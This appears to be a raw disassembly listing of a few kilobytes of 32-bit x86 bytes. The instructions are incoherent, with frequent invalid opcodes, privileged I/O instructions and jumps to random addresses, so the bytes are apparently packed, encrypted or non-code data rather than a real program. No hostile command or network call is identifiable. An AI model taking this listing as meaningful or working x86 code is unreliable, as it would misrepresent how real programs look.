  4137e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e9:	test   DWORD PTR [ecx],ebx
  4137eb:	imul   ecx,ebx,0x87bddcd1
  4137f1:	xor    BYTE PTR [ebp-0x7b973557],ah
  4137f7:	pop    ds
  4137f8:	fmul   QWORD PTR [edx-0xb7ec99a]
  4137fe:	add    eax,DWORD PTR [ecx]
  413800:	push   edx
  413801:	sub    DWORD PTR [ebx],0xb9f5294f
  413807:	sub    al,0x12
  413809:	shl    eax,1
  41380b:	or     al,0xdf
  41380d:	xbegin 0x8cd3fcdd
  413813:	dec    BYTE PTR [eax-0xe]
  413816:	push   edi
  413817:	sbb    DWORD PTR [ecx-0x503ebeef],0xeaa35668
  413821:	icebp  
  413822:	push   es
  413823:	pop    edx
  413824:	cmc    
  413825:	push   ebp
  413826:	and    dh,bh
  413828:	push   ebx
  413829:	mov    al,0xa8
  41382b:	mov    cl,0x9e
  41382d:	xor    BYTE PTR [edi+0x2147b98b],dh
  413833:	clc    
  413834:	dec    eax
  413835:	std    
  413836:	cmc    
  413837:	mov    ch,0x0
  413839:	pop    es
  41383a:	out    0xbe,al
  41383c:	mul    ah
  41383e:	jbe    0x413896
  413840:	inc    eax
  413841:	mov    ebp,0xd3ebbb8a
  413846:	xlat   BYTE PTR ds:[ebx]
  413847:	xchg   edi,eax
  413848:	add    DWORD PTR [edi-0x2d],eax
  41384b:	(bad)  
  41384c:	cli    
  41384d:	mov    edi,0xed64258c
  413852:	out    0x8,al
  413854:	cs or  eax,0xa10b0a4c
  41385a:	jb     0x41386a
  41385c:	in     al,dx
  41385d:	push   edi
  41385e:	sbb    al,0xb7
  413860:	aas    
  413861:	mov    al,bl
  413863:	mov    ebp,DWORD PTR [edx-0x6d]
  413866:	call   0x9c45d4fd
  41386b:	es jo  0x413864
  41386e:	pushf  
  41386f:	cld    
  413870:	jecxz  0x413832
  413872:	repnz scas eax,DWORD PTR es:[edi]
  413874:	sbb    BYTE PTR [edi+0x1e],cl
  413877:	push   cs
  413878:	lods   al,BYTE PTR ds:[esi]
  413879:	leave  
  41387a:	push   ebx
  41387b:	sub    eax,0x173e1ed
  413880:	retf   0xd4f6
  413883:	ret    
  413884:	pop    ebx
  413885:	xor    DWORD PTR ds:0xce4b4ec2,edx
  41388b:	arpl   WORD PTR [edx+0x25999a97],dx
  413891:	xchg   ebp,eax
  413892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413893:	mov    al,ds:0x46ae5fc3
  413898:	rcr    edx,1
  41389a:	xlat   BYTE PTR ds:[ebx]
  41389b:	(bad)  [esi-0x7a]
  41389e:	or     edi,DWORD PTR [ecx+0x7bae6799]
  4138a4:	xchg   esp,eax
  4138a5:	xchg   edi,eax
  4138a6:	cmp    DWORD PTR [ebp-0x73],ebp
  4138a9:	scas   al,BYTE PTR es:[edi]
  4138aa:	neg    DWORD PTR [eax]
  4138ac:	lock xor eax,0xe09f4157
  4138b2:	icebp  
  4138b3:	push   ecx
  4138b4:	out    dx,al
  4138b5:	adc    esi,DWORD PTR [esi+0x47]
  4138b8:	loop   0x4138b2
  4138ba:	mov    ecx,0x7ac342c4
  4138bf:	enter  0x6f8,0x76
  4138c3:	pop    es
  4138c4:	pop    ebx
  4138c5:	sub    ch,BYTE PTR [edi-0x61b51f6a]
  4138cb:	lds    esp,FWORD PTR [edx]
  4138cd:	scas   eax,DWORD PTR es:[edi]
  4138ce:	int3   
  4138cf:	mov    al,0x22
  4138d1:	dec    esp
  4138d2:	mov    ebx,0xef70ac19
  4138d7:	int3   
  4138d8:	repz add BYTE PTR [edi+0x6c1abd7c],0xd4
  4138e0:	adc    bl,bl
  4138e2:	dec    ecx
  4138e3:	lock xchg ebx,eax
  4138e5:	or     DWORD PTR [ebp+0x7],esp
  4138e8:	sub    ebx,ebx
  4138ea:	xor    DWORD PTR [edx-0xb0e2ed0],ebp
  4138f0:	pop    esp
  4138f1:	push   0xffffffbb
  4138f3:	int3   
  4138f4:	adc    eax,0xf769f61e
  4138f9:	dec    edx
  4138fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138fb:	test   DWORD PTR [eax-0x19],ebx
  4138fe:	jmp    0x5f14d0e3
  413903:	mov    ebx,0xad0738c
  413908:	dec    ecx
  413909:	push   0x65d8997a
  41390e:	rcl    BYTE PTR [ecx+0x696df934],cl
  413914:	sbb    eax,0xd5b4462
  413919:	xor    eax,DWORD PTR [ecx+ebx*2+0x7a]
  41391d:	xor    ecx,eax
  41391f:	(bad)  
  413920:	std    
  413921:	dec    ebp
  413922:	or     eax,0x765b1d54
  413927:	mov    dh,0xe9
  413929:	out    0x53,eax
  41392b:	sbb    eax,0x5fddd61b
  413930:	xchg   ecx,eax
  413931:	sbb    ah,bh
  413933:	out    dx,eax
  413934:	into   
  413935:	ss pop ecx
  413937:	add    eax,0x5295fc47
  41393c:	loop   0x413909
  41393e:	pop    edx
  41393f:	(bad)  
  413940:	std    
  413941:	pop    ebx
  413942:	add    al,0xd9
  413944:	bound  ebp,QWORD PTR [edx]
  413946:	xchg   DWORD PTR [eax-0x2c0f9bf7],esi
  41394c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41394d:	cmp    cl,BYTE PTR [edx]
  41394f:	and    al,0x8c
  413951:	push   ebp
  413952:	fisttp DWORD PTR [eax+0x31b9ed2f]
  413958:	and    BYTE PTR [edx+0x7c],cl
  41395b:	jb     0x413990
  41395d:	gs jecxz 0x41397c
  413960:	mov    ds:0x9e5b8da7,al
  413965:	xor    BYTE PTR [ebx+0x7cd83134],dh
  41396b:	fstp   st(7)
  41396d:	into   
  41396e:	cmp    eax,0xf1e2f5fd
  413973:	sub    ebp,DWORD PTR [ebx+0x25cabeac]
  413979:	jbe    0x41399f
  41397b:	popa   
  41397c:	push   esp
  41397d:	push   esi
  41397e:	(bad)  
  41397f:	cmc    
  413980:	repnz sbb al,0x8f
  413983:	push   ss
  413984:	pop    ebx
  413985:	cmp    DWORD PTR [eax],esi
  413987:	jmp    FWORD PTR [ebx]
  413989:	pop    eax
  41398a:	fucomi st,st(4)
  41398c:	jae    0x4139b1
  41398e:	push   0xffffffd5
  413990:	(bad)  
  413991:	repz test DWORD PTR [edx+0x49],ebp
  413995:	fwait
  413996:	test   eax,0xa70d6e43
  41399b:	test   BYTE PTR [ebp+0x424e0af7],dl
  4139a1:	ins    DWORD PTR es:[edi],dx
  4139a2:	add    eax,0xfaf67b8a
  4139a7:	mov    ebx,0x6cf943e9
  4139ac:	arpl   sp,dx
  4139ae:	call   0x683f5648
  4139b3:	mov    eax,0xae993a3c
  4139b8:	mov    esp,0x7bc59bfc
  4139bd:	cmp    DWORD PTR [ecx-0x677a2162],ebx
  4139c3:	mov    bh,0x2a
  4139c5:	mov    al,0x9c
  4139c7:	xchg   edi,eax
  4139c8:	retf   0x8a61
  4139cb:	jae    0x4139f5
  4139cd:	cmp    DWORD PTR [eax-0x1b],edi
  4139d0:	mov    ?,esi
  4139d2:	pop    edi
  4139d3:	xlat   BYTE PTR ds:[ebx]
  4139d4:	push   eax
  4139d5:	and    al,0xdd
  4139d7:	jge    0x413a4a
  4139d9:	mov    ebp,0x1b310ffe
  4139de:	jb     0x41399a
  4139e0:	call   0x897c81d8
  4139e5:	imul   edx,DWORD PTR [ebx],0x18
  4139e8:	sub    BYTE PTR [ebx+0x16bd1180],al
  4139ee:	mov    ebx,0x9b0bb7db
  4139f3:	or     al,0xfb
  4139f5:	xor    DWORD PTR [ebp+ebp*2-0x643113a9],0x4d5160b
  413a00:	pushf  
  413a01:	retf   0x7be8
  413a04:	iret   
  413a05:	les    ebx,FWORD PTR [eax+0x4f8fae41]
  413a0b:	retf   
  413a0c:	push   ss
  413a0d:	xchg   esi,edi
  413a0f:	inc    eax
  413a10:	sbb    eax,0x4501e382
  413a15:	repnz and BYTE PTR [edx+0x574a7b41],dh
  413a1c:	add    eax,0xeeab8738
  413a21:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  413a23:	mov    eax,0xda3e75b3
  413a28:	and    BYTE PTR [esi+0x8],0xe0
  413a2c:	mov    edx,DWORD PTR [ebx+edi*8]
  413a2f:	add    BYTE PTR [ebx+ebx*1-0x1f],bh
  413a33:	pop    ds
  413a34:	push   edi
  413a35:	(bad)  
  413a36:	fldcw  WORD PTR [esi-0x80]
  413a39:	add    bl,bh
  413a3b:	inc    esi
  413a3c:	jns    0x413ab9
  413a3e:	out    0x7f,eax
  413a40:	jle    0x413a12
  413a42:	xchg   ebp,eax
  413a43:	cmp    al,0x87
  413a45:	lock add ebp,DWORD PTR [ecx+ecx*2+0x1f18a815]
  413a4d:	ret    0xd6ab
  413a50:	sbb    eax,0xa059922
  413a55:	mov    al,0x14
  413a57:	jne    0x4139e8
  413a59:	pushf  
  413a5a:	data16 xor al,0xfd
  413a5d:	xchg   DWORD PTR es:[ecx+0x30],edx
  413a61:	pusha  
  413a62:	inc    eax
  413a63:	ins    BYTE PTR es:[edi],dx
  413a64:	lods   al,BYTE PTR ds:[esi]
  413a65:	dec    edx
  413a66:	add    al,0x37
  413a68:	js     0x4139f8
  413a6a:	fs push cs
  413a6c:	mov    DWORD PTR [edi+0x4f],eax
  413a6f:	dec    esi
  413a70:	das    
  413a71:	mov    ebp,0xf81a1707
  413a76:	icebp  
  413a77:	inc    esp
  413a78:	mov    esp,0x85248ce5
  413a7d:	mov    ds:0xc04f450,eax
  413a82:	xor    BYTE PTR ds:0x40ab2a56,al
  413a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a89:	jl     0x413a96
  413a8b:	dec    edx
  413a8c:	(bad)  
  413a8d:	push   ebp
  413a8e:	mov    esi,0xcb8b0590
  413a93:	mov    gs,WORD PTR [ebp+0x33]
  413a96:	rcr    DWORD PTR [ecx+0x5aec519d],0x6e
  413a9d:	push   esi
  413a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a9f:	jmp    0x347afab8
  413aa4:	add    eax,0x1b74d868
  413aa9:	xor    DWORD PTR [esi+0x58],edx
  413aac:	push   esp
  413aad:	rcr    BYTE PTR [eax-0x3c],1
  413ab0:	pusha  
  413ab1:	icebp  
  413ab2:	pop    ss
  413ab3:	inc    ebx
  413ab4:	int    0x10
  413ab6:	jg     0x413afb
  413ab8:	and    esi,DWORD PTR [esi-0x2d808096]
  413abe:	and    ebx,edi
  413ac0:	sbb    ch,ch
  413ac2:	jg     0x413abc
  413ac4:	sub    ah,bl
  413ac6:	fstp   DWORD PTR [ebx+0x46]
  413ac9:	inc    edi
  413aca:	je     0x413abd
  413acc:	xchg   DWORD PTR [edi+0x110555c4],eax
  413ad2:	xchg   ecx,eax
  413ad3:	jg     0x413b24
  413ad5:	xchg   BYTE PTR [edi-0x1c86546e],ch
  413adb:	mov    ds:0x916fc21e,al
  413ae0:	mov    al,0xe2
  413ae2:	pop    ds
  413ae3:	shl    BYTE PTR ds:0x8c86029a,0x66
  413aea:	push   edx
  413aeb:	shr    DWORD PTR [esi+0x294dbb03],1
  413af1:	retf   
  413af2:	mov    ch,0xa6
  413af4:	rcl    ah,1
  413af6:	(bad)  
  413af7:	scas   al,BYTE PTR es:[edi]
  413af8:	push   es
  413af9:	fisttp DWORD PTR [edx+0x6]
  413afc:	ficomp DWORD PTR [ebx-0x33]
  413aff:	mov    ecx,0x8f79840c
  413b04:	pop    esi
  413b05:	jp     0x413afb
  413b07:	in     al,0x93
  413b09:	mov    edi,0x919f26ac
  413b0e:	sbb    eax,0x9ffa024c
  413b13:	pop    esp
  413b14:	mov    al,0x9a
  413b17:	mov    ah,0x5f
  413b19:	in     al,dx
  413b1a:	pop    esp
  413b1b:	ficomp WORD PTR [eax-0x3e02355d]
  413b21:	xlat   BYTE PTR ds:[ebx]
  413b22:	push   ebx
  413b23:	mov    cl,0xa4
  413b25:	pop    ss
  413b26:	push   ebx
  413b27:	(bad)  
  413b28:	push   0x2432b7d6
  413b2d:	mov    WORD PTR [edx-0x5b],ss
  413b30:	push   ecx
  413b31:	adc    ah,dh
  413b33:	lods   al,BYTE PTR ds:[esi]
  413b34:	mov    al,0x4c
  413b36:	das    
  413b37:	mov    ebp,0x8c212ade
  413b3c:	(bad)  
  413b3d:	js     0x413bb4
  413b3f:	nop
  413b40:	jb     0x413b7c
  413b42:	jo     0x413b24
  413b44:	and    eax,0x1378dff6
  413b49:	es push cs
  413b4b:	es scas eax,DWORD PTR es:[edi]
  413b4d:	jle    0x413baf
  413b4f:	mov    ah,0xbe
  413b51:	leave  
  413b52:	push   0xffffffcd
  413b54:	loopne 0x413b06
  413b56:	(bad)  
  413b58:	dec    ebx
  413b59:	xchg   esp,eax
  413b5a:	in     al,dx
  413b5b:	inc    ecx
  413b5c:	dec    edx
  413b5d:	add    al,0xe0
  413b5f:	push   esp
  413b60:	lea    esp,[eax+0x18]
  413b63:	lahf   
  413b64:	mov    ebx,0x4a0b5ace
  413b69:	loope  0x413bbb
  413b6b:	loop   0x413bd5
  413b6d:	mov    ebp,0x6f7ddbbf
  413b72:	fistp  QWORD PTR [ebx+0x73110773]
  413b78:	mov    esi,0xcfd100f8
  413b7e:	adc    edx,ebx
  413b80:	mov    dl,0xc8
  413b82:	cwde   
  413b83:	fwait
  413b84:	xor    bh,BYTE PTR [edi-0x8]
  413b87:	or     DWORD PTR [edx+0x4],esp
  413b8a:	and    cl,al
  413b8c:	add    ah,BYTE PTR [eax-0x6]
  413b8f:	mov    ch,bl
  413b91:	cwde   
  413b92:	push   0x2e90de60
  413b97:	daa    
  413b98:	aad    0x15
  413b9a:	inc    ebp
  413b9b:	(bad)  
  413b9c:	push   0xa1f923ca
  413ba1:	cld    
  413ba2:	sub    al,0x97
  413ba4:	xchg   edi,eax
  413ba5:	cld    
  413ba6:	push   es
  413ba7:	adc    al,BYTE PTR [edi]
  413ba9:	test   esp,ebp
  413bab:	or     edi,DWORD PTR [ebx-0x36]
  413bae:	mov    ds:0x11c656ae,al
  413bb3:	jnp    0x413bfe
  413bb5:	or     esi,edx
  413bb7:	jge    0x413bae
  413bb9:	mov    esi,0x92b0c2dc
  413bbe:	cdq    
  413bbf:	(bad)  
  413bc0:	mov    eax,ds:0xd6ad04c7
  413bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bc6:	int3   
  413bc7:	(bad)  
  413bc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bc9:	sub    al,0x64
  413bcb:	xchg   ebx,eax
  413bcc:	or     BYTE PTR [ebp-0x29],bl
  413bcf:	push   ebx
  413bd0:	loop   0x413b61
  413bd2:	leave  
  413bd3:	and    al,0xf0
  413bd5:	in     eax,dx
  413bd6:	jbe    0x413bf1
  413bd8:	icebp  
  413bd9:	jo     0x413bc3
  413bdb:	adc    DWORD PTR [eax-0x5b],esi
  413bde:	sbb    DWORD PTR [ebx-0xad1be5f],0xffffff83
  413be5:	out    0xd6,eax
  413be7:	fcom   DWORD PTR [esi+eax*1-0x6a1ccdf3]
  413bee:	out    0xfd,eax
  413bf0:	cdq    
  413bf1:	mov    al,BYTE PTR [eax+ebp*1]
  413bf4:	rdmsr  
  413bf6:	sahf   
  413bf7:	pop    ebx
  413bf8:	xor    BYTE PTR [edx+0x20],bh
  413bfb:	stc    
  413bfc:	stos   DWORD PTR es:[edi],eax
  413bfd:	dec    ebp
  413bfe:	dec    edx
  413bff:	pop    edx
  413c00:	int3   
  413c01:	mov    dl,0x86
  413c03:	xchg   ah,cl
  413c05:	in     eax,0x80
  413c07:	mov    ecx,0x3e653804
  413c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c0d:	stos   DWORD PTR es:[edi],eax
  413c0e:	in     eax,dx
  413c0f:	stos   BYTE PTR es:[edi],al
  413c10:	(bad)  
  413c12:	icebp  
  413c13:	out    dx,al
  413c14:	(bad)  
  413c15:	cmp    dh,BYTE PTR [ebx]
  413c17:	fcmovnbe st,st(6)
  413c19:	jae    0x413c6c
  413c1b:	mov    dl,0xf5
  413c1d:	sti    
  413c1e:	shl    DWORD PTR [esi-0x68],0xad
  413c22:	in     eax,0x3
  413c24:	jo     0x413c11
  413c26:	ret    0xe011
  413c29:	mov    bh,0x28
  413c2b:	mov    ds,WORD PTR [ecx+edi*1]
  413c2e:	fucomi st,st(6)
  413c30:	and    BYTE PTR [ebp+0x2d],al
  413c33:	iret   
  413c34:	mov    ecx,0x7d7d2c4f
  413c39:	pop    eax
  413c3a:	mov    BYTE PTR [ebp-0x21400012],ah
  413c40:	mov    edx,0xa4e30acf
  413c45:	xchg   ebp,eax
  413c46:	xchg   ebx,eax
  413c47:	retf   
  413c48:	cmp    esi,DWORD PTR [ebx]
  413c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c4b:	test   al,0x47
  413c4d:	sbb    eax,0x812506b8
  413c52:	mov    ds,esp
  413c54:	data16 mov dh,0xd1
  413c57:	inc    esp
  413c58:	inc    esi
  413c59:	loopne 0x413c40
  413c5b:	jmp    0x3f49:0x3e849b70
  413c62:	sbb    eax,0xf89a90f1
  413c67:	das    
  413c68:	cdq    
  413c69:	fistp  QWORD PTR ds:0xdfedddb7
  413c6f:	bound  ebp,QWORD PTR [edx+0x4d]
  413c72:	xor    BYTE PTR [ebx],al
  413c74:	sbb    dh,BYTE PTR [edx-0x31]
  413c77:	ins    BYTE PTR es:[edi],dx
  413c78:	mov    cl,0x8e
  413c7a:	lods   eax,DWORD PTR ss:[esi]
  413c7c:	ins    DWORD PTR es:[edi],dx
  413c7d:	aam    0x42
  413c7f:	push   es
  413c80:	bndldx bnd0,[ebp+0x44998c8f]
  413c87:	dec    esi
  413c88:	nop
  413c89:	dec    ecx
  413c8a:	add    al,0x2b
  413c8c:	(bad)  
  413c8d:	cwde   
  413c8e:	test   BYTE PTR [eax-0x6175dfb1],cl
  413c94:	aaa    
  413c95:	out    dx,eax
  413c96:	add    al,0xbe
  413c98:	cmp    DWORD PTR [edx],esp
  413c9a:	xchg   edi,eax
  413c9b:	iret   
  413c9c:	dec    esp
  413c9d:	sub    BYTE PTR [ebp+eiz*8-0x518e97ee],dh
  413ca4:	pop    esi
  413ca5:	inc    ebx
  413ca6:	aaa    
  413ca7:	bound  edi,QWORD PTR [ebx-0x74f09814]
  413cad:	ja     0x413cfa
  413caf:	jae    0x413cb5
  413cb1:	mov    bl,0x59
  413cb3:	int3   
  413cb4:	rcr    BYTE PTR [eax-0x10],1
  413cb7:	xor    dh,BYTE PTR [edx+0x78]
  413cba:	push   esi
  413cbb:	mov    cl,0x7d
  413cbd:	loope  0x413d1f
  413cbf:	idiv   BYTE PTR ds:0x6e2fcc87
  413cc5:	add    ah,dh
  413cc7:	xchg   ebx,eax
  413cc8:	jno    0x413c4d
  413cca:	inc    eax
  413ccb:	pop    esi
  413ccc:	mov    eax,ds:0xf29738ca
  413cd1:	fimul  DWORD PTR [ebp-0x1b]
  413cd4:	jl     0x413cff
  413cd6:	leave  
  413cd7:	push   eax
  413cd8:	pop    ss
  413cd9:	xchg   ebx,eax
  413cda:	rol    DWORD PTR [eax-0x4d],0x0
  413cde:	lods   eax,DWORD PTR ds:[esi]
  413cdf:	jnp    0x413d52
  413ce1:	fnsave [ebx-0x19]
  413ce4:	repz enter 0x5b51,0xe7
  413ce9:	mov    eax,0x5dbdd15
  413cee:	jns    0x413d58
  413cf0:	clc    
  413cf1:	jle    0x413cb6
  413cf3:	adc    al,0x86
  413cf5:	or     BYTE PTR [ebp+0x59b2abb8],al
  413cfb:	shl    DWORD PTR [ebx+0x1e8bbfcf],0x4e
  413d02:	lods   eax,DWORD PTR ds:[esi]
  413d03:	pop    ss
  413d04:	ins    DWORD PTR es:[edi],dx
  413d05:	cld    
  413d06:	or     eax,0x87fa652f
  413d0b:	push   es
  413d0c:	repz inc edi
  413d0e:	repz out dx,al
  413d10:	mov    eax,ds:0xf2e2a869
  413d15:	or     dl,BYTE PTR [edi]
  413d17:	lods   al,BYTE PTR ds:[esi]
  413d18:	xor    eax,0x2104aacc
  413d1d:	inc    esp
  413d1e:	jecxz  0x413ca0
  413d20:	add    esi,DWORD PTR [ecx]
  413d22:	sbb    eax,0x983dec06
  413d27:	mov    ecx,DWORD PTR es:[edx-0xe]
  413d2b:	cmp    BYTE PTR [ecx],cl
  413d2d:	pop    ebp
  413d2e:	push   esi
  413d2f:	loop   0x413d3a
  413d31:	push   cs
  413d32:	add    esp,eax
  413d34:	lock mov eax,ds:0xe2fa4d47
  413d3a:	cs repnz enter 0x1fde,0x42
  413d40:	xor    BYTE PTR [ecx-0x41],dh
  413d43:	into   
  413d44:	sbb    DWORD PTR [ecx-0x10],0xe4169336
  413d4b:	sbb    DWORD PTR [eax],edx
  413d4d:	ja     0x413d70
  413d4f:	not    BYTE PTR [ebx-0x24]
  413d52:	mov    cl,0x17
  413d54:	aam    0x48
  413d56:	jae    0x413ce0
  413d58:	push   0xbc8b91a2
  413d5d:	ins    DWORD PTR es:[edi],dx
  413d5e:	or     al,0x8
  413d60:	mov    ah,0xed
  413d62:	mov    edi,0xfc680156
  413d67:	dec    esp
  413d68:	lahf   
  413d69:	xor    BYTE PTR [esi+0x26],al
  413d6c:	jecxz  0x413d8f
  413d6e:	sub    al,0xa8
  413d70:	in     eax,dx
  413d71:	xchg   ebp,eax
  413d72:	in     eax,0x45
  413d74:	in     al,0x94
  413d76:	aaa    
  413d77:	jge    0x413d94
  413d79:	cmp    bl,dh
  413d7b:	popa   
  413d7c:	aas    
  413d7d:	and    eax,0x97d82f5d
  413d82:	mov    ecx,0xa9614550
  413d87:	push   0xd10b2d9c
  413d8c:	std    
  413d8d:	outs   dx,DWORD PTR ds:[esi]
  413d8e:	mov    cl,0xb8
  413d90:	jne    0x413d81
  413d92:	jmp    0x2a39:0x99d6cebd
  413d99:	cmp    DWORD PTR [ebx-0x5de9b48d],eax
  413d9f:	xchg   cl,ch
  413da1:	pop    eax
  413da2:	(bad)  
  413da3:	arpl   WORD PTR [ebp+0x18],dx
  413da6:	(bad)  
  413da7:	call   0xc433307d
  413dac:	loop   0x413dfa
  413dae:	mov    ebp,0xce38e775
  413db3:	cmc    
  413db4:	mov    bl,0x30
  413db6:	adc    esi,DWORD PTR [ecx]
  413db8:	mov    ebp,0x3b0a41b7
  413dbd:	xor    al,0xbf
  413dbf:	(bad)  
  413dc0:	cmc    
  413dc1:	and    DWORD PTR [ecx-0x76],esi
  413dc4:	in     al,dx
  413dc5:	mov    ah,0xd3
  413dc7:	in     eax,dx
  413dc8:	js     0x413dea
  413dca:	test   ecx,edi
  413dcc:	or     edx,edi
  413dce:	mov    ds:0x2a987388,al
  413dd3:	mov    esp,0x92331d47
  413dd8:	mul    ebp
  413dda:	hlt    
  413ddb:	or     dl,BYTE PTR [eax-0x60]
  413dde:	sub    BYTE PTR [ebx+0x27],dl
  413de1:	xor    DWORD PTR [ecx],ebp
  413de3:	mov    al,0xe0
  413de5:	mov    WORD PTR [edi-0x1cb4022f],es
  413deb:	lahf   
  413dec:	icebp  
  413ded:	jge    0x413d7a
  413def:	dec    ecx
  413df0:	repnz sub DWORD PTR [ecx+0x494cb1b0],esi
  413df7:	aaa    
  413df8:	inc    ebp
  413df9:	cdq    
  413dfa:	xchg   esi,eax
  413dfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dfc:	adc    eax,0x99cac2f2
  413e01:	add    edi,edi
  413e03:	retf   0xeff9
  413e06:	pop    eax
  413e07:	pusha  
  413e08:	mov    WORD PTR [edx],ds
  413e0a:	xlat   BYTE PTR ds:[ebx]
  413e0b:	cwde   
  413e0c:	or     bl,ah
  413e0e:	push   cs
  413e0f:	xchg   ebp,eax
  413e10:	pop    edx
  413e11:	and    DWORD PTR [ecx+esi*2+0x35],eax
  413e15:	mov    eax,0xe2bc2ccf
  413e1a:	cmp    eax,0xb0cc9e3
  413e1f:	cmp    ch,bl
  413e21:	push   ds
  413e22:	repnz cs xchg esi,eax
  413e25:	stc    
  413e26:	data16 cmc 
  413e28:	jmp    0x9d9e:0x84cd7d2f
  413e2f:	mov    BYTE PTR [edi*1+0x6342c8cd],cl
  413e36:	jg     0x413e2f
  413e38:	div    DWORD PTR [edi+0x2e]
  413e3b:	out    0x70,eax
  413e3d:	sub    esp,edi
  413e3f:	out    dx,al
  413e40:	lds    eax,FWORD PTR [ecx-0x1343c9f4]
  413e46:	xchg   BYTE PTR [esi-0x23080e1e],bl
  413e4c:	mov    edi,0x81e7b879
  413e51:	dec    edx
  413e52:	arpl   WORD PTR [esi],si
  413e54:	shl    BYTE PTR [ebx],1
  413e56:	jb     0x413e79
  413e58:	adc    dl,BYTE PTR [ebp+0x46fd3c36]
  413e5e:	(bad)  
  413e60:	xchg   ecx,eax
  413e61:	sub    eax,DWORD PTR [esp+edx*1]
  413e64:	xchg   esi,eax
  413e65:	pop    ss
  413e66:	push   edx
  413e67:	pop    edi
  413e68:	out    dx,al
  413e69:	jmp    0x413ee1
  413e6b:	sbb    BYTE PTR [eax+0x5a4842a],ch
  413e71:	int    0xf8
  413e73:	jecxz  0x413ef3
  413e75:	jbe    0x413e12
  413e77:	lahf   
  413e78:	ficom  WORD PTR [eax]
  413e7a:	mov    edx,0x183400e6
  413e7f:	iret   
  413e80:	mov    ecx,0xf038ee3f
  413e85:	cmc    
  413e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e87:	jmp    0x36fd:0x109941e9
  413e8e:	sub    ecx,DWORD PTR [edi-0x4c]
  413e91:	cmc    
  413e92:	test   BYTE PTR [ebp+0x64],0x25
  413e96:	mov    ds:0xa661e9d4,eax
  413e9b:	mov    al,0x79
  413e9d:	cdq    
  413e9e:	mov    ds:0xa0f00069,al
  413ea3:	ja     0x413eee
  413ea5:	mov    ah,0x12
  413ea7:	xchg   ebx,eax
  413ea8:	xchg   DWORD PTR [eax+eiz*4],edi
  413eab:	jmp    0xaf850d71
  413eb0:	xlat   BYTE PTR ds:[ebx]
  413eb1:	or     DWORD PTR [esi-0x44c208f],ebx
  413eb7:	mov    al,ds:0x1a22b681
  413ebc:	or     DWORD PTR [eax-0x340f2762],ebx
  413ec2:	stos   BYTE PTR es:[edi],al
  413ec3:	xchg   esp,eax
  413ec4:	jp     0x413eea
  413ec6:	dec    eax
  413ec7:	mov    al,ds:0x2f3efacb
  413ecc:	dec    edx
  413ecd:	jnp    0x413f39
  413ecf:	inc    edi
  413ed0:	pop    esp
  413ed1:	xchg   BYTE PTR [edx+0x33],bh
  413ed4:	pop    ecx
  413ed5:	rol    DWORD PTR [eax+0x60],0x52
  413ed9:	push   es
  413eda:	mov    BYTE PTR [edx+edx*1],ah
  413edd:	outs   dx,BYTE PTR ds:[esi]
  413ede:	gs retf 0xaae9
  413ee2:	dec    edx
  413ee3:	inc    edi
  413ee4:	mov    ch,0xe0
  413ee6:	(bad)  
  413ee7:	iret   
  413ee8:	jo     0x413efd
  413eea:	mov    esp,0xb1428f40
  413eef:	aas    
  413ef0:	mov    dh,0x5
  413ef2:	mov    ds:0x1c7aeb88,eax
  413ef7:	push   eax
  413ef8:	sub    bl,BYTE PTR [edi]
  413efa:	mov    bh,0xf6
  413efc:	cld    
  413efd:	or     ebp,esp
  413eff:	or     eax,0x69855475
  413f04:	iret   
  413f05:	aas    
  413f06:	mov    ds:0x392280de,eax
  413f0b:	xor    ch,ch
  413f0d:	mov    al,0xa
  413f0f:	shl    BYTE PTR [edx-0xa],cl
  413f12:	lods   eax,DWORD PTR ss:[esi]
  413f14:	sub    DWORD PTR [edx],edx
  413f16:	repz xchg ecx,eax
  413f18:	xor    edx,DWORD PTR [edi]
  413f1a:	sti    
  413f1b:	push   0x4b
  413f1d:	mov    esp,0x1473c758
  413f22:	call   ebx
  413f24:	pop    es
  413f25:	fisttp QWORD PTR [eax-0x7b]
  413f28:	frstor fs:[esi]
  413f2b:	cmp    eax,DWORD PTR [ecx-0x2030a364]
  413f31:	cdq    
  413f32:	daa    
  413f33:	cmp    DWORD PTR [esp+eax*1],ecx
  413f36:	lock push 0xffffffe0
  413f39:	into   
  413f3a:	dec    ebp
  413f3b:	(bad)  
  413f3c:	les    ecx,FWORD PTR [edi]
  413f3e:	retf   
  413f3f:	and    al,0x75
  413f41:	pop    es
  413f42:	cmp    DWORD PTR [edi+ebx*8],eax
  413f45:	data16 jg 0x413eef
  413f48:	scas   al,BYTE PTR es:[edi]
  413f49:	dec    edx
  413f4a:	addr16 mul ebx
  413f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f4e:	ins    DWORD PTR es:[edi],dx
  413f4f:	int3   
  413f50:	popf   
  413f51:	cmp    ebx,0x5f
  413f54:	cwde   
  413f55:	js     0x413f58
  413f57:	pusha  
  413f58:	call   0xb829c6de
  413f5d:	repz cld 
  413f5f:	stc    
  413f60:	or     DWORD PTR [eax-0x54f99b1a],esp
  413f66:	(bad)  
  413f67:	push   edx
  413f68:	xchg   esi,eax
  413f69:	add    edi,DWORD PTR [esi+0x1a887f62]
  413f6f:	in     eax,0x5d
  413f71:	fsubr  QWORD PTR [edi-0x6f]
  413f74:	aam    0xc1
  413f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f77:	xchg   esi,eax
  413f78:	pop    ss
  413f79:	fnstsw WORD PTR [eax+ecx*2+0x39]
  413f7d:	call   0x627:0xe473c013
  413f84:	int3   
  413f85:	mov    al,fs:0x99e2488c
  413f8b:	pop    edi
  413f8c:	xchg   esi,eax
  413f8d:	cmp    esi,DWORD PTR [ebp-0x6e]
  413f90:	ret    
  413f91:	xor    al,0x76
  413f93:	fidiv  WORD PTR [edx+esi*1-0x35]
  413f97:	popf   
